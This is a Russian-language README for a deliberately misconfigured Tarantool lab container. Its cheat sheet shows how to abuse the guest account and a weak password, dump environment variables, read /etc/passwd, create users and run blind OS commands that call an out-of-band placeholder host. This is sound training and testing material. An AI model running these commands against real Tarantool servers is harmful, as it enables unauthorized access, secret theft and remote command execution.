# Сборка Tarantool для иллюстрации ошибок конфигурации

## Описание
Сборка включает в себя 3 тестовых приложения

- Порт 3301. Приложение, где учетная запись guest имеет права на создание объектов, вызов модуля os и т.п.
- Порт 3302. Учетная запись guest ограничена в правах, но есть учетная запись test с простым паролем
- Порт 3303. Учетная запись guest ограничена в правах, остальные учетные записи имеют несловарный пароль.

## Сборка и запуск

```
docker build . -t 'missconfigured-tarantool'
docker run --net=host --rm --name missconfigured-tarantool missconfigured-tarantool
```

## Образ с Docker Hub

```
docker run --net=host --rm --name missconfigured-tarantool 0x566164696d/missconfigured-tarantool
```

## Команды tarantoolctl и примеры эксплуатации

### Ruby

Подключение под пользователем guest
```
require 'tarantool16'
tdb = Tarantool16.new host:'127.0.0.1:3301'
```
Подключение под пользователем с паролем
```
require 'tarantool16'
tdb = Tarantool16.new host:'127.0.0.1:3302', user:'test', password:'qwerty321'
```
Информация о текущем пользователе  
`tdb.call( 'box.session.user', [] )`

Детальная информация о пользователе  
`tdb.call( 'box.schema.user.info', ['myusername'])`

Получение списка пользователей  
`tdb.call( 'box.space._user:select', [] )`

Создание пользователя  
`tdb.call( 'box.schema.user.create', ['petya', {password: 'X'}] )`

Получение переменных окружения  
`tdb.call( 'os.environ', [] )`

Выполнение команд OS  
`tdb.call( 'os.execute', ['getent hosts __some_oob_servive__'] )`

### tarantoolctl

Подключение под guest  
`tarantoolctl connect 127.0.0.1:3301`

Подключение с login \ pass  
`tarantoolctl connect login:pass@127.0.0.1:3301`

Получение переменных окружения  
`echo "os.environ()" | tarantoolctl connect 127.0.0.1:3301`

Чтением локальных файлов
```
echo "fh = fio.open('/etc/passwd', {'O_RDONLY'})" | tarantoolctl connect 127.0.0.1:3301
echo "fh:pread(10000,0)" | tarantoolctl connect 127.0.0.1:3301
```

Выполнение комманд OS также работает, но в blind режиме  
`echo "os.execute('getent hosts __some_oob_servive__')" | tarantoolctl connect 127.0.0.1:3301`

## Ссылки
https://github.com/tarantool/tarantool-ruby  
https://www.tarantool.io/en/doc/1.10/book/box/authentication/  
